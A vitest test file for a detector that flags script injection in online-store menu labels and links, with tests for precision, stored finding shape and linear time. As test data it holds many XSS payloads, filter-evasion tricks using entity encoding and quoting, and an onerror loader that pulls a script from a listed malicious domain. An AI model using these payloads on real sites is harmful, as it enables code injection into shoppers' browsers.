/**
 * Menu-label injection detector (gc-7gjj.1, spike §2.4): every rule, the
 * markup a merchant uses on purpose (not flagged), entity-encoded text (not
 * flagged), the stored shape, and the linear-time bound. Pure: no network.
 */
import { describe, it, expect } from "vitest";

import { getFindingImpact } from "../../app/lib/finding-remediation";
import { MENU_INCIDENT_CONTEXT, MENU_RISK_GROUP_FACTS } from "../../app/lib/security-risk";
import { findingCostLine } from "../../app/lib/top-findings";
import {
  detectMenuInjection,
  isScriptUrl,
  matchMenuItem,
  MAX_MENU_INJECTION_FINDINGS,
  MENU_EXCERPT_MAX,
  menuInjectionDescription,
  menuItemFilename,
  menuItemPath,
  type MenuItemData,
} from "../../app/services/menu-injection-detector.server";

const item = (
  title: string,
  url: string | null = "/collections/all",
  extra: Partial<MenuItemData> = {},
): MenuItemData => ({
  menuId: "100",
  menuTitle: "Main menu",
  itemId: "200",
  parents: [],
  title,
  url,
  ...extra,
});

/** The findings alone (most tests do not look at truncation). */
const findingsOf = (items: MenuItemData[]) => detectMenuInjection(items).findings;

// The 17TRACK payload shape (October 2026), host from the curated list.
const SEVENTEEN_TRACK =
  "Shop<img src=x onerror=\"s=document.createElement('script');s.src='https://cartassure.top/check-out/assets/l2.js';document.head.appendChild(s)\">";

describe("matchMenuItem: the rules", () => {
  it("flags the 17TRACK onerror loader in a label (handler rule)", () => {
    expect(matchMenuItem(item(SEVENTEEN_TRACK))).toMatchObject({ rule: "handler", field: "title" });
  });

  it.each([
    "<script src=https://example.com/x.js></script>",
    "Sale <SCRIPT>alert(1)</SCRIPT>",
    "<script\n>x</script>",
  ])("flags a script tag in a label: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("script");
  });

  it.each([
    '<img src=x onerror="alert(1)">',
    "<svg/onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<a href=/x onclick='go()'>Shop</a>",
    '<div ONMOUSEOVER = "x()">x</div>',
    '<img src="a.png"onerror="x()">',
  ])("flags an on*= handler inside a tag: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("handler");
  });

  it.each([
    "<iframe src=https://example.com></iframe>",
    "<object data=x></object>",
    "<embed src=x>",
    '<div srcdoc="&lt;script&gt;">x</div>',
    '<meta http-equiv="refresh" content="0;url=https://example.com">',
  ])("flags a frame, embed or meta refresh: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("frame");
  });

  // Deferred LOW (gc-7gjj.1): <base> re-points every relative URL on the page,
  // <frame>/<applet> load a document or code, <link> loads a stylesheet,
  // module or import.
  it.each([
    '<base href="https://evil.example/">Shop',
    "<BASE href=//evil.example/>",
    '<frame src="https://evil.example/x">',
    "<applet code=x.class></applet>",
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    "<link/rel=modulepreload href=//evil.example/x.js>",
    "Shop<link>",
  ])("flags a base, frame, applet or link tag: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("frame");
  });

  it.each([
    "javascript:alert(1)",
    "  JavaScript:alert(1)",
    "java\tscript:alert(1)",
    "java\u0000script:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html;base64,PHNjcmlwdD4=",
  ])("flags a script URL as the item's link: %j", (url) => {
    expect(matchMenuItem(item("Shop", url))).toMatchObject({ rule: "script_url", field: "url" });
  });

  it.each([
    '<a href="javascript:alert(1)">Shop</a>',
    "<a href=javascript:alert(1)>Shop</a>",
    '<a href="javascript&colon;alert(1)">Shop</a>',
    '<a href="&#106;avascript:alert(1)">Shop</a>',
    "<a href='java&#x09;script:alert(1)'>Shop</a>",
    // Zero-padded references (audit fix, M1): browsers accept any zeros.
    '<a href="&#00000000106;avascript:alert(1)">Shop</a>',
    '<a href="&#x0000006a;avascript:alert(1)">Shop</a>',
  ])("flags a script URL in an attribute inside a label (references decoded): %j", (title) => {
    expect(matchMenuItem(item(title))).toMatchObject({ rule: "script_url", field: "title" });
  });

  it("points the excerpt at a listed domain written in mixed case (audit fix)", () => {
    const title = `${"x".repeat(100)} <a href="https://CartAssure.TOP/x">Shop</a>`;
    const match = matchMenuItem(item(title));
    expect(match).toMatchObject({ rule: "domain", field: "title", domain: "cartassure.top" });
    expect(title.slice(match!.at).startsWith("CartAssure.TOP")).toBe(true);
  });

  it("flags a listed malicious domain in a label or in the link", () => {
    expect(matchMenuItem(item('<a href="https://www.cartassure.top/x">Shop</a>'))).toMatchObject({
      rule: "domain",
      field: "title",
      domain: "cartassure.top",
    });
    expect(matchMenuItem(item("Shop", "https://cartassure.top/checkout"))).toMatchObject({
      rule: "domain",
      field: "url",
      domain: "cartassure.top",
    });
  });

  // Audit fix: a `>` inside a quoted attribute value does not end the tag,
  // and whitespace around `=` can be any length.
  it.each([
    '<img alt=">" src=x onerror=alert(1)>',
    "<img title='>' src=x onerror=alert(1)>",
    '<img alt = ">>" onerror=alert(1)>',
    `<img src=x onerror${" ".repeat(25)}=alert(1)>`,
    `<img src=x onerror=${"\n".repeat(30)}alert(1)>`,
  ])("flags a handler after a quoted > or wide whitespace: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("handler");
  });

  // Each split pinned on its own (third audit round): the quote-aware split
  // alone sees a handler after a quoted `>`; the plain split alone sees a tag
  // the quote-aware split reads as part of a value.
  it("the quote-aware split alone catches a handler after a quoted >", () => {
    // Plain split: `<img alt=">` ends early and `" onerror=1>` is text.
    expect(matchMenuItem(item('<img alt=">" onerror=1>'))?.rule).toBe("handler");
  });

  it("the HTML = rule: an unquoted value after a stray = does not swallow the next tag", () => {
    expect(matchMenuItem(item('<img src=x ="><iframe src=y>'))?.rule).toBe("frame");
    expect(matchMenuItem(item("<b a=b><iframe src=y>"))?.rule).toBe("frame");
  });

  // Re-audit HIGH: a quote not directly after `=` (or after an NBSP) does not
  // open a value, and no split may hide an anchored frame or meta tag.
  it.each([
    '<a b==">"<iframe src=//evil.example/x>"',
    '<a b=\u00a0">"<iframe src=//evil.example/x>"',
    '<a b==">"<meta http-equiv=refresh content="0;url=//evil.example">"',
    '<a b==">"<embed src=//evil.example/x>"',
    '<a b==">"<object data=//evil.example/x>"',
    '<a title="x>"<iframe src=//evil.example/x>',
  ])("flags a frame or meta tag hidden behind a quote trick: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("frame");
  });

  it("flags srcdoc and a script URL with wide whitespace around =", () => {
    expect(matchMenuItem(item(`<div srcdoc${" ".repeat(30)}="x">`))?.rule).toBe("frame");
    expect(matchMenuItem(item(`<a href${" ".repeat(30)}="javascript:x">y</a>`))?.rule).toBe(
      "script_url",
    );
  });

  it("a quoted value that never closes reads the rest as that tag (doubt resolves toward flagging)", () => {
    expect(matchMenuItem(item('<b title="never closed onerror=x>Shop'))?.rule).toBe("handler");
    expect(matchMenuItem(item('<b title="never closed>Shop'))).toBeNull();
  });

  it("the most dangerous rule wins when several match", () => {
    expect(matchMenuItem(item("<script>x</script><img onerror=y>"))?.rule).toBe("script");
    expect(matchMenuItem(item("<img src=x onerror=y>", "javascript:x"))?.rule).toBe("handler");
  });
});

describe("matchMenuItem: false positives (precision first)", () => {
  it.each([
    "Shop",
    "Sale <b>50% off</b>",
    '<span class="badge badge--sale">New</span> Arrivals',
    '<img src="https://cdn.shopify.com/s/files/icon.png" alt="">Gifts',
    "Line<br>break",
    "<em>Summer</em> &amp; <strong>Beach</strong>",
    "Learn JavaScript: the basics",
    "Click online for deals",
    "Tom & Jerry <3 cartoons",
    "a < b and c > d",
    "On sale = yes",
    "Contact: info@example.com",
    "Link in bio",
    "Base layers",
    "Frame shop",
    "Applet store",
    "<linkedin>",
    "<baseball> caps",
    "<frameset> sale",
    "&lt;link href=x&gt;",
    "&lt;base href=x&gt;",
    "",
  ])("never flags plain text or ordinary markup: %j", (title) => {
    expect(matchMenuItem(item(title))).toBeNull();
  });

  it.each([
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&lt;img src=x onerror=alert(1)&gt;",
    "&#60;script&#62;",
  ])("never flags entity-encoded markup (it prints as text): %j", (title) => {
    expect(matchMenuItem(item(title))).toBeNull();
  });

  it.each([
    "/collections/all",
    "https://shop.example.com/pages/about",
    "https://www.instagram.com/shop",
    "mailto:hi@example.com",
    "tel:+15551234",
    "/search?q=javascript:",
    null,
    "",
  ])("never flags an ordinary link: %j", (url) => {
    expect(matchMenuItem(item("Shop", url))).toBeNull();
  });

  it("never flags a lookalike of a listed domain", () => {
    expect(matchMenuItem(item("Shop", "https://notcartassure.top/x"))).toBeNull();
    expect(matchMenuItem(item("Shop", "https://cartassure.top.example.com/x"))).toBeNull();
  });

  // Audit fix: only real attribute names count, read by the attribute walk.
  it.each([
    '<a title="see onboarding=1">Shop</a>',
    "<a title='x onclick=y'>Shop</a>",
    '<span data-x="a/onload=b">New</span>',
    '<a title="x srcdoc=y">Shop</a>',
    '<meta name="x http-equiv=refresh">',
  ])("never flags on*=, srcdoc= or http-equiv= written inside a quoted value: %j", (title) => {
    expect(matchMenuItem(item(title))).toBeNull();
  });

  it("a repeated attribute is ignored, as in a browser: the first one wins (audit fix)", () => {
    expect(matchMenuItem(item('<a href="/ok" href="javascript:alert(1)">Shop</a>'))).toBeNull();
    expect(matchMenuItem(item('<a href="javascript:alert(1)" href="/ok">Shop</a>'))?.rule).toBe(
      "script_url",
    );
  });

  it("an attribute value that merely mentions javascript: later in the value is not a script URL", () => {
    expect(matchMenuItem(item('<a href="/learn?topic=javascript:basics">Shop</a>'))).toBeNull();
  });
});

describe("matchMenuItem: HTML whitespace and navigable attributes (wave 3 D5)", () => {
  it.each([
    "<iframe\u000bsrc=//e.example/x>",
    "<iframe\u00a0src>",
    "<link\u000bhref=//e>",
    "<meta\u00a0http-equiv=refresh>",
  ])("a tag name run on through \\v or NBSP is not a frame or meta tag: %j", (title) => {
    expect(matchMenuItem(item(title))).toBeNull();
  });

  it.each([
    "<iframe\tsrc=//e>",
    "<iframe\fsrc=//e>",
    "<iframe\nsrc=//e>",
    "<iframe\rsrc=//e>",
    "<iframe/src=//e>",
  ])("HTML whitespace or / after the name still makes a frame: %j", (title) => {
    expect(matchMenuItem(item(title))?.rule).toBe("frame");
  });

  it("an unclosed value with on*= behind \\v or NBSP is not a handler", () => {
    expect(matchMenuItem(item('<b title="x\u000bonerror=1>Shop'))).toBeNull();
    expect(matchMenuItem(item('<b title="x\u00a0onerror=1>Shop'))).toBeNull();
    expect(matchMenuItem(item('<b title="x\tonerror=1>Shop'))?.rule).toBe("handler");
  });

  it("a script URL counts only in a navigable attribute, not an image src", () => {
    expect(matchMenuItem(item('<img src="data:text/html,<b>x</b>">'))).toBeNull();
    expect(matchMenuItem(item('<img src="javascript:alert(1)">'))).toBeNull();
    expect(matchMenuItem(item('<span title="javascript:x">Shop</span>'))).toBeNull();
    for (const title of [
      '<a href="data:text/html,<b>x</b>">Shop</a>',
      '<form action="javascript:alert(1)"><button>x</button></form>',
      "<input type=image formaction=javascript:alert(1)>",
      '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
      '<svg><set attributeName=href to="javascript:alert(1)"/></svg>',
    ]) {
      expect(matchMenuItem(item(title)), title).toMatchObject({
        rule: "script_url",
        field: "title",
      });
    }
  });
});

describe("isScriptUrl", () => {
  it("reads the scheme the way a browser does (whitespace and control characters dropped)", () => {
    expect(isScriptUrl(" \n javascript:x")).toBe(true);
    expect(isScriptUrl("JAVASCRIPT:x")).toBe(true);
    expect(isScriptUrl("data:text/html,<b>")).toBe(true);
    expect(isScriptUrl("data:image/png;base64,xx")).toBe(false);
    expect(isScriptUrl("https://x.com/javascript:")).toBe(false);
    expect(isScriptUrl("")).toBe(false);
  });
});

describe("detectMenuInjection: stored shape", () => {
  it("emits one HIGH MENU_INJECTION finding per matching item, with a fixed shape", () => {
    const findings = findingsOf([
      item("Shop"),
      item(SEVENTEEN_TRACK, "/collections/all", {
        itemId: "201",
        parents: ["Catalog"],
      }),
    ]);
    expect(findings).toHaveLength(1);
    const [f] = findings;
    expect(f).toMatchObject({
      filename: expect.stringMatching(/^menus\/100\/items\/201\/[0-9a-f]{16}$/),
      lineNumber: 0,
      findingType: "MENU_INJECTION",
      severity: "HIGH",
    });
    const [path, seen] = f.codeSnippet.split("\n");
    // Each title is cut to 80 characters (77 + "...").
    expect(path).toBe(`Main menu > Catalog > ${SEVENTEEN_TRACK.slice(0, 77)}...`);
    expect(seen.startsWith("Label: ")).toBe(true);
    expect(seen).toContain("onerror");
    expect(f.description).toBe(menuInjectionDescription({ rule: "handler", field: "title" }));
  });

  it("names the link when the URL matched", () => {
    const [f] = findingsOf([item("Shop", "javascript:steal()")]);
    expect(f.codeSnippet.split("\n")[1]).toBe("Link: javascript:steal()");
    expect(f.description).toMatch(/^A menu item's link contains a link that runs code/);
  });

  it("names the listed domain from the curated list, never page text", () => {
    const [f] = findingsOf([item("Shop", "https://cartassure.top/x")]);
    expect(f.description).toContain("a link to cartassure.top, a known malicious domain");
  });

  it("bounds the excerpt and every title in the path", () => {
    const long = `${"A".repeat(5_000)}<img src=x onerror=x()>${"B".repeat(5_000)}`;
    const [f] = findingsOf([
      item(long, "/x", { menuTitle: "M".repeat(500), parents: ["P".repeat(500)] }),
    ]);
    const [path, seen] = f.codeSnippet.split("\n");
    expect(seen.length).toBeLessThanOrEqual("Label: ".length + MENU_EXCERPT_MAX);
    expect(seen).toContain("onerror");
    for (const part of path.split(" > ")) expect(part.length).toBeLessThanOrEqual(80);
  });

  it("collapses line breaks so the stored snippet stays two lines", () => {
    const [f] = findingsOf([
      item("Shop\n<img src=x\nonerror=x()>", "/x", { menuTitle: "Main\nmenu" }),
    ]);
    expect(f.codeSnippet.split("\n")).toHaveLength(2);
  });

  it("an untitled menu or item still has a readable path", () => {
    expect(menuItemPath({ menuTitle: "", parents: [""], title: "" })).toBe(
      "(untitled) > (untitled) > (untitled)",
    );
  });

  it("no two different items share a locator, NUL bytes included (re-audit fix)", () => {
    const at = (title: string, url: string) =>
      menuItemFilename({ menuId: "1", itemId: "2", title, url });
    expect(at("a\u0000b", "c")).not.toBe(at("a", "b\u0000c"));
    expect(at("ab", "")).not.toBe(at("a", "b"));
  });

  it("the locator is the numeric ids plus a hash of the full label and link", () => {
    const base = { menuId: "1", itemId: "2", title: "<script>x</script>", url: "/x" };
    expect(menuItemFilename(base)).toMatch(/^menus\/1\/items\/2\/[0-9a-f]{16}$/);
    expect(menuItemFilename(base)).toBe(menuItemFilename({ ...base }));
  });

  // Audit fix: the fingerprint hashes the filename, so any rewrite of the
  // item must change it, even where the stored path and excerpt are cut.
  it.each([
    ["the link only", { url: "javascript:b()" }],
    ["the label past the 80-character path cut", { title: `${"A".repeat(100)}<script>y</script>` }],
    [
      "the label past the excerpt",
      { title: `${"A".repeat(100)}<script>x</script>${"B".repeat(500)}z` },
    ],
  ])("a rewrite of %s gives a different locator", (_label, change) => {
    const before = item(`${"A".repeat(100)}<script>x</script>${"B".repeat(500)}`, "javascript:a()");
    const after = { ...before, ...change };
    expect(menuItemFilename(after)).not.toBe(menuItemFilename(before));
  });

  it("caps the number of findings for a flood and says so", () => {
    const items = Array.from({ length: MAX_MENU_INJECTION_FINDINGS + 30 }, (_, i) =>
      item("<script>x</script>", "/x", { itemId: String(i) }),
    );
    const result = detectMenuInjection(items);
    expect(result.findings).toHaveLength(MAX_MENU_INJECTION_FINDINGS);
    expect(result.truncated).toBe(true);
  });

  it("exactly the cap is not truncated", () => {
    const items = Array.from({ length: MAX_MENU_INJECTION_FINDINGS }, (_, i) =>
      item("<script>x</script>", "/x", { itemId: String(i) }),
    );
    expect(detectMenuInjection([...items, item("Shop")]).truncated).toBe(false);
  });

  it("empty input yields nothing", () => {
    expect(detectMenuInjection([])).toEqual({ findings: [], truncated: false });
  });

  it("merchant copy: no em or en dashes, no product-name misspelling", () => {
    for (const rule of ["script", "handler", "frame", "script_url", "domain"] as const) {
      for (const field of ["title", "url"] as const) {
        const text = menuInjectionDescription({ rule, field, domain: "cartassure.top" });
        expect(text).not.toMatch(/[—–]/);
        expect(text).not.toMatch(/ghost code/i);
      }
    }
  });
});

describe("detectMenuInjection: linear time", () => {
  it.each([
    ["1 MB of tag starts with no closing >", "<a x ".repeat(200_000)],
    ["1 MB of one tag full of near-handlers", `<a ${"on ".repeat(330_000)}>`],
    ["1 MB of attributes with near-script values", `<a ${"href=javas ".repeat(90_000)}>`],
    ["1 MB of meta tags without http-equiv", "<meta a>".repeat(125_000)],
    ["1 MB of text", "x".repeat(1_000_000)],
    ["1 MB of character references", "&#106;".repeat(170_000)],
    ["1 MB of quoted values", `<a ${'x=">" '.repeat(160_000)}>`],
    ["1 MB of unclosed quoted values", '<a x="'.repeat(200_000)],
    ["1 MB of whitespace after a handler name", `<a onerror${" ".repeat(1_000_000)}`],
    ["1 MB of handler names and spaces", `<a ${"onx    ".repeat(140_000)}>`],
    ['1 MB of stray =" pairs', `<a ${'="'.repeat(500_000)}`],
    ["1 MB of unclosed quoted values after =", '<a b=" '.repeat(140_000)],
    ["1 MB of = runs", `<a ${"=".repeat(1_000_000)}>`],
    ["1 MB of empty tags", "<a >".repeat(250_000)],
  ])("%s stays fast", (_label, title) => {
    const started = Date.now();
    detectMenuInjection([item(title, title)]);
    expect(Date.now() - started).toBeLessThan(2_000);
  });
});

describe("menu copy is hedged (wave 3 U2)", () => {
  it("the stored description never claims a hijack or fake checkout", () => {
    for (const rule of ["script", "handler", "frame", "script_url", "domain"] as const) {
      for (const field of ["title", "url"] as const) {
        const text = menuInjectionDescription({ rule, field, domain: "cartassure.top" });
        expect(text, rule).not.toMatch(/hijack|fake checkout|hacked/i);
        expect(text, rule).toContain("could load code into your storefront");
        expect(text, rule).toContain(MENU_INCIDENT_CONTEXT);
      }
    }
  });

  it("the Start here cost line and the finding's impact text are hedged too", () => {
    expect(findingCostLine("MENU_INJECTION")).toBe("This code could run in shoppers' browsers.");
    expect(getFindingImpact("MENU_INJECTION")).not.toMatch(/hijack|fake checkout/i);
  });

  it("the menu banner and the stored description share the incident context", () => {
    expect(MENU_RISK_GROUP_FACTS).toContain(MENU_INCIDENT_CONTEXT);
  });
});
